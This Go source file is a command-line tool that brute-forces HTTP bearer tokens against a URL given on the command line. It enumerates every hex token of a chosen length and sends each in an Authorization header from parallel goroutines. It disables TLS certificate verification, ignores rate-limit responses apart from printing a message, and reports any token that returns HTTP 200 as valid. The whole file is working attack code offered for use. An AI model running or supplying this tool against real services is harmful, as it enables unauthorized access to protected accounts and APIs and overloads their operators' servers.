package main

import (
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"time"
)

func generateTokens(alphabet string, length int, cap int) <-chan string {
	c := make(chan string, cap)

	go func(c chan string) {
		defer close(c)
		generateToken(c, "", alphabet, length)
	}(c)

	return c
}

func generateToken(c chan string, token string, alphabet string, length int) {
	if length <= 0 {
		c <- token
		return
	}

	var newToken string
	for _, ch := range alphabet {
		newToken = token + string(ch)
		generateToken(c, newToken, alphabet, length-1)
	}
}

func get(URL string, token string) (int, error) {
	client := &http.Client{
		Timeout: time.Minute * 10,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return errors.New("redirect not allowed")
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest(http.MethodGet, URL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))

	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	return resp.StatusCode, nil
}

func attack(URL string, alphabet string, tokenLength int, parallelAttacks int, resultCh chan string, abort chan struct{}) {
	tokenCh := generateTokens(alphabet, tokenLength, parallelAttacks)

	var wg sync.WaitGroup
	defer wg.Wait()
	for i := 0; i < parallelAttacks; i++ {
		wg.Add(1)
		go func(tokenCh <-chan string) {
			defer wg.Done()
			for {
				select {
				case <-abort:
					return
				case token := <-tokenCh:
					statusCode, err := get(URL, token)
					if err != nil {
						fmt.Printf("Error: %v\n", err)
						return
					} else if statusCode == http.StatusOK {
						resultCh <- token
					} else if statusCode == http.StatusTooManyRequests {
						fmt.Println("Rate limit reached!")
					}
				}

			}
		}(tokenCh)
	}
}

var (
	url             string
	tokenLength     int
	parallelAttacks int
)

func init() {
	flag.StringVar(&url, "url", "", "URL to brute force")
	flag.IntVar(&tokenLength, "token-length", 32, "size of the bearer token")
	flag.IntVar(&parallelAttacks, "parallel-attacks", 8, "number of parallel attacks")

	flag.Parse()
}

func main() {
	const alphabet = "0123456789abcdef"
	abort := make(chan struct{})
	resultCh := make(chan string)

	go func() {
		attack(url, alphabet, tokenLength, parallelAttacks, resultCh, abort)
		close(resultCh)
	}()

	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	go func() {
		for _ = range signalCh {
			fmt.Println("Brute force attack aborted!")
			close(abort)
		}
	}()

	for token := range resultCh {
		fmt.Printf("Valid Token: %s\n", token)
	}
	fmt.Println("Brute force attack completed!")
}
